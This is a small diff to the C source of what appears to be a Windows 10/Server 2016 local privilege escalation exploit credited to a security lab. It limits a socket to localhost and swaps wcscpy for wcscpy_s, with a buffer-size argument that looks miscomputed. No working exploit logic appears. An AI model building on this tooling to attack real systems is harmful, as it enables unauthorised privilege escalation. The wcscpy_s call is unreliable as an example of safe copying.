@@ -35,7 +35,7 @@ DWORD __stdcall TransferThread(LPVOID lpParam)
 	}
 
 	bind_addr.sin_family = AF_INET;
-	bind_addr.sin_addr.S_un.S_addr = INADDR_ANY;
+	bind_addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");// INADDR_ANY;
 	bind_addr.sin_port = htons(9090);
 
 	if (bind(bind_sock, (sockaddr*)&bind_addr, sizeof(sockaddr_in)) != NULL)
@@ -105,7 +105,7 @@ int _tmain(int argc, TCHAR* argv[])
 		wprintf(_TEXT("command too long\r\n"));
 		return 0;
 	}
-	wcscpy(command_buffer, argv[1]);
+	wcscpy_s(command_buffer, wcslen(argv[1]) * 2 + 2, argv[1]);
 
 	wprintf(_TEXT("Win10&Win2016 LPE by @Topsec_Alpha_lab(https://github.com/alpha1ab)\r\n"));
 
